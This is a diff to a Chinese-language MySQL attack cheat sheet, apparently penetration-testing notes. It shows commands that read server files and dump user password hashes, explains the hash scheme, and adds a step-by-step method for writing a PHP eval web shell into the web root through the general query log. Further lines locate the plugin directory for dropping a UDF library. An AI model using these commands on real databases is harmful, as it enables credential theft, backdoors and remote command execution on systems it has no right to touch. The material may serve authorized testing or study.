@@ -122,7 +122,7 @@ select load_file("D:\web\config.php");
 # 查询数据库版本
 SELECT @@global.version;
 
-# 查询数据用户及密码
+# 查询数据用户及密码  说明:mysql密码的加密方式为 password_str = concat('*', sha1(unhex(sha1(password))))
 select host,user,password from mysql.user;
 
 # 查询general_log的状态
@@ -136,6 +136,19 @@ show variables like 'general_log';
 SELECT @@global.general_log_file;
 # 方法2
 show variables like 'general_log_file';
+
+# 借助general_log_file 日志文件 getshell
+# 步骤1 修改变量值 开启general_log_file
+set global general_log = "ON";
+set global general_log_file='D:/web/test.php';
+# 步骤2 做查询 可将以下查询语句 写入到日志文件
+select '<?php eval($_POST[cmd]);?>';
+
+# 查询mysql二进制文件的位置(安装后的文件夹的路径)
+select @@basedir;
+
+# 查询mysql plugin文件夹的路径 (可把自己的UDF二进制库文件 放到plugin文件夹中)
+select @@plugin_dir;
 ```
 
 #### 参数 - OS命令执行
